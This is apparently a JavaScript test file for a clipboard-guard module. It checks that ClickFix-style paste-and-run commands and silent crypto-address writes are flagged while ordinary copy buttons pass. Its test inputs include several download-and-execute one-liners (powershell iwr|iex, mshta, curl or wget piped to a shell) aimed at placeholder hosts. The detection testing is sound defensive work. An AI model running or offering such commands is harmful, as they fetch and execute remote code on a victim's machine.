import test from "node:test";
import assert from "node:assert/strict";
import { clipboardRisk, Burst, GUARD_KINDS } from "../src/guard-rules.js";

const g = (gesture, lure = false) => ({ gesture, lure: () => lure });

test("ClickFix payloads are caught (click + 'press Win+R' wording, or no click)", () => {
  const cmds = [
    'powershell -w hidden -c "iwr http://x.test/a | iex"',
    "powershell.exe -enc SQBFAFgA",
    "mshta https://bad.test/v.hta",
    "cmd /c start /min powershell -w h -c iex(irm bad.test)",
    "curl -fsSL https://bad.test/i.sh | sh",
    "wget -qO- https://bad.test/i.sh | sudo bash",
  ];
  for (const c of cmds) {
    assert.equal(clipboardRisk(c, g(true, true))?.kind, "clipboard-command", c);
    assert.equal(clipboardRisk(c, g(false))?.kind, "clipboard-command", c);
  }
});

test("docs 'Copy' button: real click and no paste-it-yourself wording is left alone", () => {
  assert.equal(clipboardRisk("curl -fsSL https://get.example.com/install.sh | sh", g(true, false)), null);
  assert.equal(clipboardRisk("npm install express", g(false)), null);
  assert.equal(clipboardRisk("git clone https://github.com/a/b.git", g(false)), null);
  assert.equal(clipboardRisk("Order #12345 confirmed", g(false)), null);
});

test("crypto address: silent write is flagged, a copy-address button is not", () => {
  const btc = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq";
  const eth = "0x32Be343B94f860124dC4fEe278FDCBD38C102D88";
  assert.equal(clipboardRisk(btc, g(false))?.kind, "clipboard-crypto");
  assert.equal(clipboardRisk(eth, g(false))?.kind, "clipboard-crypto");
  assert.equal(clipboardRisk(btc, g(true)), null);
  assert.equal(clipboardRisk(eth, g(true)), null);
});

test("Burst counts inside the window only", () => {
  const b = new Burst(1000);
  assert.equal(b.hit(0), 1); assert.equal(b.hit(500), 2); assert.equal(b.hit(900), 3);
  assert.equal(b.hit(2000), 1);
});

test("every guard kind has a tier and weight", () => {
  for (const [k, v] of Object.entries(GUARD_KINDS)) assert.ok(["strong", "weak"].includes(v.tier) && v.weight >= 0 && v.label, k);
});
